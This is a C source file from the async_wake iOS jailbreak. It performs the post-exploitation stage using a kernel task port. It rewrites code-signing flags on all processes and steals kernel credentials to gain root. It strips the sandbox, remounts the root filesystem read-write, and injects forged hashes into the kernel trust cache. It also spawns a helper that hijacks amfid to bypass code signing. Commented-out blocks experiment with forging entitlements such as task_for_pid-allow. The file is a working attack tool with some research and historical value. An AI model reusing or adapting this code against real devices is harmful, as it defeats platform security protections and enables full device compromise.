//
//  fun.c
//  async_wake_ios
//
//  Created by George on 14/12/17.
//  Copyright © 2017 Ian Beer. All rights reserved.
//

#include "fun.h"
#include "kcall.h"

unsigned offsetof_p_pid = 0x10;               // proc_t::p_pid
unsigned offsetof_task = 0x18;                // proc_t::task
unsigned offsetof_p_ucred = 0x100;            // proc_t::p_ucred
unsigned offsetof_p_csflags = 0x2a8;          // proc_t::p_csflags
unsigned offsetof_itk_self = 0xD8;            // task_t::itk_self (convert_task_to_port)
unsigned offsetof_itk_sself = 0xE8;           // task_t::itk_sself (task_get_special_port)
unsigned offsetof_itk_bootstrap = 0x2b8;      // task_t::itk_bootstrap (task_get_special_port)
unsigned offsetof_ip_mscount = 0x9C;          // ipc_port_t::ip_mscount (ipc_port_make_send)
unsigned offsetof_ip_srights = 0xA0;          // ipc_port_t::ip_srights (ipc_port_make_send)
unsigned offsetof_special = 2 * sizeof(long); // host::special

#define	CS_VALID		0x0000001	/* dynamically valid */
#define CS_ADHOC		0x0000002	/* ad hoc signed */
#define CS_GET_TASK_ALLOW	0x0000004	/* has get-task-allow entitlement */
#define CS_INSTALLER		0x0000008	/* has installer entitlement */

#define	CS_HARD			0x0000100	/* don't load invalid pages */
#define	CS_KILL			0x0000200	/* kill process if it becomes invalid */
#define CS_CHECK_EXPIRATION	0x0000400	/* force expiration checking */
#define CS_RESTRICT		0x0000800	/* tell dyld to treat restricted */
#define CS_ENFORCEMENT		0x0001000	/* require enforcement */
#define CS_REQUIRE_LV		0x0002000	/* require library validation */
#define CS_ENTITLEMENTS_VALIDATED	0x0004000

#define	CS_ALLOWED_MACHO	0x00ffffe

#define CS_EXEC_SET_HARD	0x0100000	/* set CS_HARD on any exec'ed process */
#define CS_EXEC_SET_KILL	0x0200000	/* set CS_KILL on any exec'ed process */
#define CS_EXEC_SET_ENFORCEMENT	0x0400000	/* set CS_ENFORCEMENT on any exec'ed process */
#define CS_EXEC_SET_INSTALLER	0x0800000	/* set CS_INSTALLER on any exec'ed process */

#define CS_KILLED		0x1000000	/* was killed by kernel for invalidity */
#define CS_DYLD_PLATFORM	0x2000000	/* dyld used to load this is a platform binary */
#define CS_PLATFORM_BINARY	0x4000000	/* this is a platform binary */
#define CS_PLATFORM_PATH	0x8000000	/* platform binary by the fact of path (osx only) */

char *itoa(long n)
{
	int len = n==0 ? 1 : floor(log10l(labs(n)))+1;
	if (n<0) len++; // room for negative sign '-'
	
	char    *buf = calloc(sizeof(char), len+1); // +1 for null
	snprintf(buf, len+1, "%ld", n);
	return   buf;
}

typedef struct {
	uint64_t prev;
	uint64_t next;
	uint64_t start;
	uint64_t end;
} kmap_hdr_t;

void let_the_fun_begin(mach_port_t tfp0, mach_port_t user_client) {
	// Loads the kernel into the patch finder, which just fetches the kernel memory for patchfinder use
	init_kernel(find_kernel_base(), NULL);
	
	dlopen(resourceInBundle("test.dylib"), RTLD_NOW);
	
	// Get the slide
	uint64_t slide = find_kernel_base() - 0xFFFFFFF007004000;
	printf("[fun] slide: 0x%016llx\n", slide);
	
	kmap_hdr_t kernel_map;
	
	rkbuffer(rk64(0xFFFFFFF0075D5E20+slide)+0x10, &kernel_map, sizeof(kernel_map));

	uint64_t zm_tmp;
#   define ZM_FIX_ADDR(addr) \
( \
zm_tmp = (kernel_map.start & 0xffffffff00000000) | ((addr) & 0xffffffff), \
zm_tmp < kernel_map.start ? zm_tmp + 0x100000000 : zm_tmp \
)

    #define kexecute(addr, x0, x1, x2, x3, x4, x5, x6) kcall(addr, 7, x0, x1, x2, x3, x4, x6, x6)
	
	// Get our and the kernels struct proc from allproc
	uint32_t our_pid = getpid();
	uint64_t our_proc = 0;
	uint64_t kern_proc = 0;
	uint64_t container_proc = 0;
	uint32_t amfid_pid = 0;
	
	uint64_t proc = rk64(find_allproc());
	while (proc) {
		uint32_t pid = (uint32_t)rk32(proc + 0x10);
		char name[40] = {0};
		rkbuffer(proc+0x268, name, 20);
		if (pid == our_pid) {
			our_proc = proc;
		} else if (pid == 0) {
			kern_proc = proc;
		} else if (strstr(name, "amfid")) {
			container_proc = proc;
			amfid_pid = pid;
//			printf("amfid's pid is %d", pid);
//			uint64_t mac_pol = rk64(rk64(proc+0x100)+0x78);
//			//				printf("MAC policies for this process are at %016llx\n", mac_pol);
//			uint64_t amfi_mac_pol = rk64(mac_pol+0x8); // This is actually an OSDictionary zz
//			//				printf("AMFI MAC policies at %016llx\n", amfi_mac_pol);
//
//			uint64_t str = kmem_alloc(strlen("get-task-allow")+1);
//			wkbuffer(str, "get-task-allow", strlen("get-task-allow"));
//			uint64_t bol = ZM_FIX_ADDR(kexecute(0xFFFFFFF0074A68C8+slide, 1, 0, 0, 0, 0, 0, 0));
//			kexecute(rk64(rk64(amfi_mac_pol)+8*31), amfi_mac_pol, str, bol, 0, 0, 0, 0);
////
//			str = kmem_alloc(strlen("dynamic-codesigning")+1);
//			wkbuffer(str, "dynamic-codesigning", strlen("dynamic-codesigning"));
//			bol = ZM_FIX_ADDR(kexecute(0xFFFFFFF0074A68C8+slide, 1, 0, 0, 0, 0, 0, 0));
//			kexecute(rk64(rk64(amfi_mac_pol)+8*31), amfi_mac_pol, str, bol, 0, 0, 0, 0);
			
			
//			uint32_t f = rk32(amfi_mac_pol+20); // Number of items in the dictionary
//			//				printf("%d\n", f);
//
//
//			uint64_t g = rk64(amfi_mac_pol+32); // Item buffer
//			//				printf("%016llx\n", g);
//
//			for (int i = 0; i < f; i++) {
//				//					printf("%016llx\n", rk64(g+16*i)); // value is at this + 8
//				printf("%016llx\n", rk64(rk64(g+16*i+8)));
//				//					printf("%016llx\n", rk64(rk64(rk64(g+16*i)+0x10)));
//
//				size_t length = kexecute(0xFFFFFFF00709BDE0+slide, rk64(rk64(g+16*i)+0x10), 0, 0, 0, 0, 0, 0);
//
//				char* s = (char*)calloc(length+1, 1);
//				rkbuffer(rk64(rk64(g+16*i)+0x10), s, length);
//				printf("%s\n", s);
//
//			}
		}
		if (pid != 0) {
			uint32_t csflags = rk32(proc + offsetof_p_csflags);
			wk32(proc + offsetof_p_csflags, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW | CS_VALID) & ~(CS_RESTRICT | CS_HARD));
		}
		proc = rk64(proc);
	}
	
	printf("[fun] our proc is at 0x%016llx\n", our_proc);
	printf("[fun] kern proc is at 0x%016llx\n", kern_proc);
	
	// Give us some special flags
//	uint32_t csflags = rk32(our_proc + offsetof_p_csflags);
//	wk32(our_proc + offsetof_p_csflags, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_HARD));
	
	// Properly copy the kernel's credentials so setuid(0) doesn't crash
	uint64_t kern_ucred = 0;
	kexecute(find_copyout(), kern_proc+0x100, &kern_ucred, sizeof(kern_ucred), 0, 0, 0, 0);
	
	uint64_t self_ucred = 0;
	kexecute(find_copyout(), our_proc+0x100, &self_ucred, sizeof(self_ucred), 0, 0, 0, 0);

	kexecute(find_bcopy(), kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t), 0, 0, 0, 0);
	kexecute(find_bzero(), self_ucred + 0x18, 12, 0, 0, 0, 0, 0);
	
	uint64_t sb_ucred = 0;
	kexecute(find_copyout(), container_proc+0x100, &sb_ucred, sizeof(sb_ucred), 0, 0, 0, 0);
	
	kexecute(find_bcopy(), kern_ucred + 0x78, sb_ucred + 0x78, sizeof(uint64_t), 0, 0, 0, 0);
	kexecute(find_bzero(), sb_ucred + 0x18, 12, 0, 0, 0, 0, 0);
	
	// setuid(0) + test
	{
		
		printf("[fun] our uid was %d\n", getuid());
		
		setuid(0);
		
		printf("[fun] our uid is %d\n", getuid());
		
		FILE *f = fopen("/var/mobile/.root_fun", "w");
		if (f == 0) {
			printf("[fun] failed to write test file. something didn't work\n");
		} else {
			printf("[fun] wrote test file: %p\n", f);
		}
		fclose(f);
	}

	{
		printf("[fun] remounting: %d\n", mountroot());
		
		int fd = open("/.bit_of_fun", O_RDONLY);
		if (fd == -1) {
			fd = creat("/.bit_of_fun", 0644);
		} else {
			printf("[fun] file already exists!\n");
		}
		close(fd);
		
		printf("[fun] Did we mount / as read+write? %s\n", file_exist("/.bit_of_fun") ? "yes" : "no");
	}
	
	// Prepare our binaries
	{
		if (!file_exist("/fun_bins")) {
			mkdir("/fun_bins", 777);
		}
		
		/* uncomment if you need to replace the binaries */
		unlink("/fun_bins/inject_amfid");
		unlink("/fun_bins/amfid_payload.dylib");
        unlink("/fun_bins/test.dylib");

		if (!file_exist("/fun_bins/inject_amfid")) {
			cp(resourceInBundle("inject_amfid"), "/fun_bins/inject_amfid");
			chmod("/fun_bins/inject_amfid", 777);
		}
		if (!file_exist("/fun_bins/amfid_payload.dylib")) {
			cp(resourceInBundle("amfid_payload.dylib"), "/fun_bins/amfid_payload.dylib");
			chmod("/fun_bins/amfid_payload.dylib", 777);
		}
		if (!file_exist("/fun_bins/test.dylib")) {
			cp(resourceInBundle("test.dylib"), "/fun_bins/test.dylib");
			chmod("/fun_bins/test.dylib", 777);
		}
		
		printf("[fun] copied the required binaries into the right places\n");
	}
	
	// trust cache injection
	{
		/*
		 Note this patch still came from @xerub's KPPless branch, but detailed below is kind of my adventures which I rediscovered most of what he did
		 
		 So, as said on twitter by @Morpheus______, iOS 11 now uses SHA256 for code signatures, rather than SHA1 like before.
		 What confuses me though is that I believe the overall CDHash is SHA1, but each subhash is SHA256. In AMFI.kext, the memcmp
		 used to check between the current hash and the hashes in the cache seem to be this CDHash. So the question is do I really need
		 to get every hash, or just the main CDHash and insert that one into the trust chain?
		 
		 If we look at the trust chain code checker (0xFFFFFFF00637B3E8 6+ 11.1.2), it is pretty basic. The trust chain is in the format of
		 the following (struct from xerub, but I've checked with AMFI that it is the case):
		 
		 struct trust_mem {
		 uint64_t next; 				// +0x00 - the next struct trust_mem
		 unsigned char uuid[16];		// +0x08 - The uuid of the trust_mem (it doesn't seem important or checked apart from when importing a new trust chain)
		 unsigned int count;			// +0x18 - Number of hashes there are
		 unsigned char hashes[];		// +0x1C - The hashes
		 }
		 
		 The trust chain checker does the following:
		 - Find the first struct that has a count > 0
		 - Loop through all the hashes in the struct, comparing with the current hash
		 - Keeps going through each chain, then when next is 0, it finishes
		 
		 UPDATE: a) was using an old version of JTool. Now I realised the CDHash is SHA256
		 b) For launchd (whose hash resides in the AMFI cache), the first byte is used as an index sort of thing, and the next *19* bytes are used for the check
		 This probably means that only the first 20 bytes of the CDHash are used in the trust cache check
		 
		 So our execution method is as follows:
		 - Calculate the CD Hashes for the target resources that we want to play around with
		 - Create a custom trust chain struct, and insert it into the existing trust chain - only storing the first 20 bytes of each hash
		 - ??? PROFIT
		 */
		
		uint64_t tc = find_trustcache();
		printf("[fun] trust cache at: %016llx\n", rk64(tc));
		
		typedef char hash_t[20];
		
		struct trust_chain {
			uint64_t next; 				// +0x00 - the next struct trust_mem
			unsigned char uuid[16];		// +0x08 - The uuid of the trust_mem (it doesn't seem important or checked apart from when importing a new trust chain)
			unsigned int count;			// +0x18 - Number of hashes there are
			hash_t hash[10];		// +0x1C - The hashes
		};
		
		struct trust_chain fake_chain;
		
		fake_chain.next = rk64(tc);
		*(uint64_t *)&fake_chain.uuid[0] = 0xabadbabeabadbabe;
		*(uint64_t *)&fake_chain.uuid[8] = 0xabadbabeabadbabe;
		fake_chain.count = 2;
		
		uint8_t *hash = get_sha256(get_code_directory("/fun_bins/inject_amfid"));
		uint8_t *hash2 = get_sha256(get_code_directory("/fun_bins/amfid_payload.dylib"));
		
		memmove(fake_chain.hash[0], hash, 20);
		memmove(fake_chain.hash[1], hash2, 20);

        free(hash);
        free(hash2);
		
		uint64_t kernel_trust = kmem_alloc(sizeof(fake_chain));
		wkbuffer(kernel_trust, &fake_chain, sizeof(fake_chain));
		wk64(tc, kernel_trust);
		
		printf("[fun] Wrote the signatures into the trust cache!\n");
	}
	
//	printf("[fun] currently cs_debug is at %d\n", rk32(0xFFFFFFF0076220EC+slide));
//	wk32(0xFFFFFFF0076220EC+slide, 100);
	
#define BinaryLocation "/fun_bins/inject_amfid"
	
	pid_t pd;

	const char* args[] = {BinaryLocation, itoa(amfid_pid), NULL};
	(void)posix_spawn(&pd, BinaryLocation, NULL, NULL, (char **)&args, NULL);

//	mach_port_t pt = 0;
//	printf("getting Springboards task: %s\n", mach_error_string(task_for_pid(mach_task_self(), 55, &pt)));

	int tries = 3;
	while (tries-- > 0) {
		sleep(1);
		uint64_t proc = rk64(find_allproc());
		while (proc) {
			uint32_t pid = rk32(proc + offsetof_p_pid);
			if (pid == pd) {
				uint32_t csflags = rk32(proc + offsetof_p_csflags);
				csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD);
				wk32(proc + offsetof_p_csflags, csflags);
				tries = 0;
				
//				uint64_t self_ucred = 0;
//				kexecute(find_copyout(), proc+0x100, &self_ucred, sizeof(self_ucred), 0, 0, 0, 0);
////
////				KCALL(find_bcopy(), kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t), 0, 0, 0, 0);
////				KCALL(find_bzero(), self_ucred + 0x18, 12, 0, 0, 0, 0, 0);
//
//
//
//				uint64_t mac_pol = rk64(self_ucred+0x78);
////				printf("MAC policies for this process are at %016llx\n", mac_pol);
//				uint64_t amfi_mac_pol = rk64(mac_pol+0x8); // This is actually an OSDictionary zz
////				printf("AMFI MAC policies at %016llx\n", amfi_mac_pol);
//
//				uint32_t f = rk32(amfi_mac_pol+20); // Number of items in the dictionary
////				printf("%d\n", f);
//
//
//				uint64_t g = rk64(amfi_mac_pol+32); // Item buffer
////				printf("%016llx\n", g);
//
//				for (int i = 0; i < f; i++) {
////					printf("%016llx\n", rk64(g+16*i)); // value is at this + 8
//					printf("%016llx\n", rk64(rk64(g+16*i+8)));
////					printf("%016llx\n", rk64(rk64(rk64(g+16*i)+0x10)));
//
//					size_t length = kexecute(0xFFFFFFF00709BDE0+slide, rk64(rk64(g+16*i)+0x10), 0, 0, 0, 0, 0, 0);
//
//					char* s = (char*)calloc(length+1, 1);
//					rkbuffer(rk64(rk64(g+16*i)+0x10), s, length);
//					printf("%s\n", s);
//
//				}
//
//				printf("Gave us task_for_pid-allow\n");
//
//
////
//				uint64_t str = kmem_alloc(strlen("task_for_pid-allow")+1);
//				wkbuffer(str, "task_for_pid-allow", strlen("task_for_pid-allow"));
//				uint64_t getObject = rk64(rk64(amfi_mac_pol)+304);
//				uint64_t out = ZM_FIX_ADDR(kexecute(getObject, amfi_mac_pol, str, 0, 0, 0, 0, 0));
//
//				printf("%08x\n", rk32(out+0xc));
//
////				printf("%016llx\n", kexecute(slide+0xFFFFFFF00707FB58, out, 0, 0, 0, 0, 0, 0));
////
////				KCALL(getObject, amfi_mac_pol, str, 0, 0, 0, 0, 0);
////				uint64_t out = returnval;
//				printf("%016llx\n", out);
////
////				KCALL(slide+0xFFFFFFF00707FB58, out|0xfffffff000000000, 0, 0, 0, 0, 0, 0);
////				printf("%016llx\n", returnval);
////
//
//
//				uint64_t bo = kmem_alloc(8);
//				kexecute(0xFFFFFFF00637D88C + slide, proc, str, bo, 0, 0, 0, 0);
//				printf("hi - %016llx\n", rk64(bo));
//
//				uint64_t new_ent_dict = ZM_FIX_ADDR(kexecute(0xFFFFFFF0074AAD50+slide, 4, 0, 0, 0, 0, 0, 0)); // OSDictionary::withCapacity
//				printf("new_ent_dict - %016llx\n", rk64(new_ent_dict));
//
//				uint64_t symbol = ZM_FIX_ADDR(kexecute(0xFFFFFFF0074C2D90+slide, str, 0, 0, 0, 0, 0, 0)); // OSSymbol::withCString
//				printf("symbol - %016llx\n", rk64(symbol));
//
//				uint64_t bol = ZM_FIX_ADDR(kexecute(0xFFFFFFF0074A68C8+slide, 1, 0, 0, 0, 0, 0, 0)); // OSBoolean::withBoolean
////																					 0x0000000012800000
//				printf("bol - %016llx\n", rk64(bol));
//				uint64_t bol2 = ZM_FIX_ADDR(kexecute(0xFFFFFFF0074A68C8+slide, 1, 0, 0, 0, 0, 0, 0));
//
//				uint64_t str2 = kmem_alloc(strlen("com.apple.system-task-ports")+1);
//				wkbuffer(str2, "com.apple.system-task-ports", strlen("com.apple.system-task-ports"));
//
//
//				kexecute(rk64(rk64(new_ent_dict)+8*31), new_ent_dict, str, bol, 0, 0, 0, 0);
//				kexecute(rk64(rk64(new_ent_dict)+8*31), new_ent_dict, str2, bol2, 0, 0, 0, 0);
//				wk64(rk64(kern_ucred+0x78)+0x8, amfi_mac_pol);
//
//
////				uint64_t vnode = rk64(proc+0x248);
////				uint64_t off =rk64(proc+0x250);
//
//				uint64_t csblob = ZM_FIX_ADDR(kexecute(slide+0xFFFFFFF0073B717C, our_proc, 0, 0, 0, 0, 0, 0));
//				printf("csblob - %016llx\n", csblob);
//
//				uint64_t dict = ZM_FIX_ADDR(kexecute(slide+0xFFFFFFF0073B71F4, csblob, 0, 0, 0, 0, 0, 0));
//				printf("dict - %016llx - %016llx\n", dict, rk64(dict));
//
//				kexecute(rk64(rk64(dict)+8*31), dict, str, bol, 0, 0, 0, 0);
//				kexecute(rk64(rk64(dict)+8*31), dict, str2, bol2, 0, 0, 0, 0);
//
//				kexecute(slide+0xFFFFFFF0073B7228, csblob, dict, 0, 0, 0, 0, 0);
////
//				 f = rk32(dict+20); // Number of items in the dictionary
//				//				printf("%d\n", f);
//
//
//				 g = rk64(dict+32); // Item buffer
//				//				printf("%016llx\n", g);
//
//				for (int i = 0; i < f; i++) {
//					//					printf("%016llx\n", rk64(g+16*i)); // value is at this + 8
//					printf("%016llx\n", rk64(rk64(g+16*i+8)));
//					//					printf("%016llx\n", rk64(rk64(rk64(g+16*i)+0x10)));
//
//					size_t length = kexecute(0xFFFFFFF00709BDE0+slide, rk64(rk64(g+16*i)+0x10), 0, 0, 0, 0, 0, 0);
//
//					char* s = (char*)calloc(length+1, 1);
//					rkbuffer(rk64(rk64(g+16*i)+0x10), s, length);
//					printf("%s\n", s);
//
//				}

				break;
			}
			proc = rk64(proc);
		}
	}

	waitpid(pd, NULL, 0);
	
	
	
	
	// Cleanup
	
//	char *nmz = strdup("/dev/disk0s1s1");
//	rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz);
//	printf("[fun] remounting: %d\n", rv);

	wk64(rk64(kern_ucred+0x78)+0x8, 0);
	term_kernel();
	
}
